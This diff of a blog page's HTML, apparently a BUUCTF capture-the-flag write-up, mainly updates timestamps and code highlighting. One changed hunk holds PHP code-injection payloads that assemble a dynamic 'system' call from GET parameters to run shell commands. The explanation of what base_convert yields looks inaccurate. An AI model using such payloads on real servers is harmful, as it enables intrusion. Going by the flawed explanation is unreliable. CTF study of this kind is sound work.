@@ -409,7 +409,7 @@
 <meta property="og:image" content="https://colourful228.github.io/2026/02/10/BUUCTF/image-20260427184832892.png">
 <meta property="og:image" content="https://colourful228.github.io/2026/02/10/BUUCTF/image-20260427184829803.png">
 <meta property="article:published_time" content="2026-02-10T15:36:49.000Z">
-<meta property="article:modified_time" content="2026-05-11T16:17:23.184Z">
+<meta property="article:modified_time" content="2026-06-04T09:16:31.152Z">
 <meta property="article:author" content="Colourful">
 <meta property="article:tag" content="BUU">
 <meta name="twitter:card" content="summary_large_image">
@@ -802,7 +802,7 @@
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2026-05-12T00:17:23+08:00
+                    本文最后更新于 2026-06-04T17:16:31+08:00
                   
                   
 
@@ -1612,11 +1612,11 @@
 <p>有长度限制</p>
 <p>这里需要用到PHP动态调用函数值，GET传参的外部赋值以及PHP数学函数的运用</p>
 <p>构造原始payload</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$p</span>=(_GET[<span class="hljs-type">p1</span>])(_GET[<span class="hljs-type">p2</span>]);(<span class="hljs-variable">$</span><span class="hljs-variable">$p</span>&#123;p1&#125;)(<span class="hljs-variable">$</span><span class="hljs-variable">$p</span>&#123;p2&#125;)&amp;p1=system&amp;p2=<span class="hljs-built_in">ls</span>;<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$p</span>=(_GET[p1])(_GET[p2]);($<span class="hljs-variable">$p</span>&#123;p1&#125;)($<span class="hljs-variable">$p</span>&#123;p2&#125;)&amp;p1=system&amp;p2=<span class="hljs-built_in">ls</span>;<br></code></pre></td></tr></table></figure>
 
 <p>但需要利用数学函数进行一些进制转换</p>
 <p>最终payload</p>
-<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$<span class="hljs-literal">pi</span>=base_convert(<span class="hljs-number">37907361743</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(dechex(<span class="hljs-number">1598506324</span>));($$<span class="hljs-literal">pi</span>&#123;<span class="hljs-literal">pi</span>&#125;)($$<span class="hljs-literal">pi</span>&#123;<span class="hljs-built_in">pow</span>&#125;)&amp;<span class="hljs-literal">pi</span>=system&amp;<span class="hljs-built_in">pow</span>=ls<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$pi</span>=base_convert(37907361743,10,36)(dechex(1598506324));($<span class="hljs-variable">$pi</span>&#123;pi&#125;)($<span class="hljs-variable">$pi</span>&#123;pow&#125;)&amp;pi=system&amp;pow=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>
 
 <p>base_convert(37907361743,10,36)表示system</p>
 <p>(dechex(1598506324))表示_GET</p>
@@ -2723,7 +2723,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2026年5月12日</div>
+          <div>2026年6月4日</div>
         </div>
       
       
